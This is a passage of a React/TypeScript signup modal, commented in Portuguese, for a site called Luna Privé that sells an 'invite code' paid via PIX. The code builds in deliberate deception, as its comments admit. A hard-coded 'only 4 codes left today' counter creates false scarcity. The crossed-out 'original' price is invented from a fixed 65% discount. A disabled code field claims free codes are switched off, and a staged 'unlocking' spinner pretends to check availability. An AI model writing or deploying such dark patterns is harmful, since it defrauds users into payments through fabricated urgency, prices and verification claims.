  const [stage, setStage] = useState<'intro' | 'unlocking' | 'offer' | 'pix'>('intro')

  // Desconto fixo de 65% (conforme solicitado) para exibir o "de/por".
  const DISCOUNT = 65
  const amount = amountCents / 100
  const originalAmount = amountCents > 0 ? amount / (1 - DISCOUNT / 100) : 0
  const brl = (v: number) => `R$ ${v.toFixed(2).replace('.', ',')}`

  // Códigos "restantes hoje": valor pequeno e fixo para senso de escassez.
  const CODES_LEFT = 4

  // Loading de "desbloqueio" antes de revelar a oferta.
  useEffect(() => {
    if (stage !== 'unlocking') return
    const t = setTimeout(() => setStage('offer'), 2200)
    return () => clearTimeout(t)
  }, [stage])

  function handlePaymentConfirmed() {
    window.location.assign('/confirmation')
  }

  return (
    <div className="animate-pop relative flex max-h-[92dvh] w-full max-w-sm flex-col overflow-hidden rounded-3xl bg-card shadow-2xl shadow-primary/25">
      {/* Borda em gradiente */}
      <div
        className="pointer-events-none absolute inset-0 z-20 rounded-3xl"
        aria-hidden="true"
        style={{
          padding: '1.25px',
          background:
            'linear-gradient(to bottom, oklch(0.5 0.15 15 / 0.95), oklch(0.6 0.16 15 / 0.32) 45%, oklch(0.66 0.17 15 / 0.08) 100%)',
          WebkitMask: 'linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0)',
          WebkitMaskComposite: 'xor',
          maskComposite: 'exclude',
        }}
      />
      {/* Imagem de fundo */}
      <div className="absolute inset-0" aria-hidden="true">
        <img
          src="/images/convite-fundo.jpg"
          alt=""
          className="size-full object-cover object-center"
        />
        <div className="absolute inset-0 bg-card/65" />
        <div className="absolute inset-0 bg-gradient-to-b from-card/30 via-card/60 to-card/90" />
      </div>

      <div className="relative z-10 flex min-h-0 flex-1 flex-col overflow-y-auto px-6 pb-7 pt-8 text-center">
        {stage === 'unlocking' ? (
          <div className="flex flex-1 flex-col items-center justify-center py-10">
            <h2 className="text-balance text-xl font-bold leading-tight text-foreground">
              Desbloqueando seu código
            </h2>
            <div className="mt-7 flex flex-col items-center gap-5">
              <span className="relative flex size-20 items-center justify-center" aria-hidden="true">
                <svg className="size-20 animate-spin [animation-duration:1.1s]" viewBox="0 0 50 50">
                  <circle cx="25" cy="25" r="20" fill="none" className="stroke-border" strokeWidth="4" />
                  <circle
                    cx="25"
                    cy="25"
                    r="20"
                    fill="none"
                    className="stroke-primary"
                    strokeWidth="4"
                    strokeLinecap="round"
                    strokeDasharray="125.6"
                    strokeDashoffset="88"
                  />
                </svg>
                <Gift className="absolute size-7 text-primary" />
              </span>
              <p className="text-pretty text-sm font-medium leading-relaxed text-muted-foreground" role="status" aria-live="polite">
                Verificando códigos disponíveis...
              </p>
            </div>
          </div>
        ) : stage === 'pix' ? (
          <>
            <img
              src="/images/luna-prive-logo.png"
              alt="Luna Privé"
              className="mx-auto h-11 w-auto"
            />
            <div className="mt-4">
              <PixContent
                isOpen
                embedded
                onClose={() => setStage('offer')}
                email={email}
                amount={amount}
                userName={userName}
                type="invite"
                pixType={pixType}
                pixKey={pixKey}
                compact
                discountPercent={DISCOUNT}
                title="Seu Código de Convite"
                subtitle="Pague via PIX para liberar seu acesso"
                trackInitiateCheckout
                onPaymentConfirmed={handlePaymentConfirmed}
              />
            </div>
          </>
        ) : (
          <>
            <img
              src="/images/luna-prive-logo.png"
              alt="Luna Privé"
              className="mx-auto h-11 w-auto"
            />

            <h2 className="mt-5 text-balance text-2xl font-bold leading-tight text-foreground">
              Código de Convite
            </h2>
            <p className="mx-auto mt-2.5 max-w-[18rem] text-pretty text-sm leading-relaxed text-muted-foreground">
              {stage === 'offer'
                ? 'Todas as usuárias precisam de um código de convite para entrar no Luna Privé.'
                : 'Apenas usuárias convidadas podem se inscrever na plataforma. Digite seu código abaixo para ativar sua conta.'}
            </p>

            {stage === 'intro' && (
              <>
                <input
                  type="text"
                  inputMode="text"
                  autoComplete="off"
                  disabled
                  placeholder="DIGITE SEU CÓDIGO"
                  aria-label="Código de convite"
                  className="mt-6 w-full rounded-2xl border border-border/70 bg-background/60 px-5 py-3.5 text-center text-sm font-semibold uppercase tracking-[0.25em] text-foreground placeholder:tracking-[0.2em] placeholder:text-muted-foreground/60 disabled:opacity-60"
                />
                <p className="mt-3.5 text-pretty text-[0.8rem] font-medium leading-relaxed text-primary">
                  Os códigos grátis estão desativados no momento, desbloqueie seu código no botão abaixo:
                </p>
                <div className="mt-3 flex items-center justify-center gap-2 rounded-2xl border border-border/60 bg-background/50 px-5 py-3.5">
                  <span className="size-1.5 animate-pulse rounded-full bg-primary" aria-hidden="true" />
                  <p className="text-sm text-muted-foreground">
                    Restam apenas <span className="font-bold text-primary">{CODES_LEFT}</span> códigos hoje
                  </p>
                </div>
                <button
                  type="button"
                  onClick={() => setStage('unlocking')}
                  className="luna-gradient mt-5 flex w-full items-center justify-center gap-2.5 rounded-2xl py-4 text-base font-bold text-primary-foreground shadow-lg shadow-primary/30 transition hover:scale-[1.02] active:scale-[0.98]"
                >
                  <Gift className="size-5" aria-hidden="true" />
                  Resgatar meu código
                  <ChevronRight className="size-5" aria-hidden="true" />
                </button>
                <p className="mt-4 flex items-center justify-center gap-1.5 text-[0.7rem] text-muted-foreground/80">
                  <ShieldCheck className="size-3.5 text-positive" aria-hidden="true" />
                  Ambiente seguro e verificado
                </p>
              </>
            )}

            {stage === 'offer' && (
              <>
                {/* Escassez */}
                <div className="mt-5 flex items-center justify-center gap-2 rounded-2xl border border-primary/40 bg-primary/[0.07] px-5 py-3">
                  <span className="size-1.5 animate-pulse rounded-full bg-primary" aria-hidden="true" />
                  <p className="text-sm text-foreground">
                    Restam apenas{' '}
                    <span className="font-bold text-primary">{CODES_LEFT} códigos</span> hoje
                  </p>
                </div>

                {/* Desconto + valor */}
                <div className="mt-4 rounded-2xl border border-border/60 bg-background/55 px-5 py-5">
                  <span className="inline-flex items-center gap-1.5 rounded-full bg-primary/15 px-3 py-1 text-[0.7rem] font-bold uppercase tracking-wide text-primary">
                    {DISCOUNT}% OFF hoje
                  </span>
                  <div className="mt-3 flex items-center justify-center gap-2.5">
                    {originalAmount > 0 && (
                      <span className="text-base font-semibold text-muted-foreground line-through decoration-primary/70">
                        {brl(originalAmount)}
                      </span>
                    )}
                    <span className="text-3xl font-extrabold tracking-tight text-foreground">
                      {amountCents > 0 ? brl(amount) : '--'}
                    </span>
                  </div>
                  <p className="mt-2 text-pretty text-[0.78rem] leading-relaxed text-muted-foreground">
                    Valor único do seu código de convite para liberar o acesso completo à plataforma.
                  </p>
                </div>

                <button
                  type="button"
                  onClick={() => setStage('pix')}
                  className="luna-gradient mt-5 flex w-full items-center justify-center gap-2.5 rounded-2xl py-4 text-base font-bold text-primary-foreground shadow-lg shadow-primary/30 transition hover:scale-[1.02] active:scale-[0.98]"
                >
                  <Gift className="size-5" aria-hidden="true" />
                  Obter meu Código
                  <ChevronRight className="size-5" aria-hidden="true" />
                </button>
                <p className="mt-4 flex items-center justify-center gap-1.5 text-[0.7rem] text-muted-foreground/80">
                  <ShieldCheck className="size-3.5 text-positive" aria-hidden="true" />
                  Ambiente seguro e verificado
                </p>
              </>
            )}
          </>
        )}
      </div>
    </div>
  )
}


/* ---------- Helpers ---------- */

function formatPhone(value: string) {
  const digits = value.replace(/\D/g, '').slice(0, 11)
  if (digits.length <= 2) return digits.length ? `(${digits}` : ''
  if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`
}

function formatPixKey(type: string, value: string) {
  switch (type) {
    case 'CPF': {
      const d = value.replace(/\D/g, '').slice(0, 11)
      if (d.length <= 3) return d
      if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`
      if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`
      return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`
    }
    case 'CNPJ': {
      const d = value.replace(/\D/g, '').slice(0, 14)
      if (d.length <= 2) return d
      if (d.length <= 5) return `${d.slice(0, 2)}.${d.slice(2)}`
      if (d.length <= 8) return `${d.slice(0, 2)}.${d.slice(2, 5)}.${d.slice(5)}`
      if (d.length <= 12) return `${d.slice(0, 2)}.${d.slice(2, 5)}.${d.slice(5, 8)}/${d.slice(8)}`
      return `${d.slice(0, 2)}.${d.slice(2, 5)}.${d.slice(5, 8)}/${d.slice(8, 12)}-${d.slice(12)}`
    }
    case 'Telefone':
      return formatPhone(value)
    case 'Email':
      // remove espaços, mantém o resto livre
      return value.replace(/\s/g, '')
    default:
      // Chave aleatória — texto livre
      return value
  }
}

function pixPlaceholder(type: string) {
  switch (type) {
    case 'CPF':
      return '000.000.000-00'
    case 'CNPJ':
      return '00.000.000/0000-00'
    case 'Telefone':
      return '(00) 00000-0000'
    case 'Email':
      return 'seu@email.com'
    default:
      return 'sua chave aleatória'
  }
}
